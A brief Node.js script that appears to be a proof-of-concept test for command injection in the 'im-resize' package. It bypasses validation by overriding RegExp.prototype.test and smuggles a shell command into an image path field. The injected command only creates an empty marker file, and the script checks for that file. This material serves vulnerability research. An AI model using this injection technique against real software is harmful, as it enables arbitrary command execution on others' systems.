RegExp.prototype.test = () => true;
const root = require('im-resize');
const fs = require('fs');
const path = './im-resize';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let image = { path: '& fsutil file createnew im-resize 0 &' };
let output = { versions: [] };
root(image, output, function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});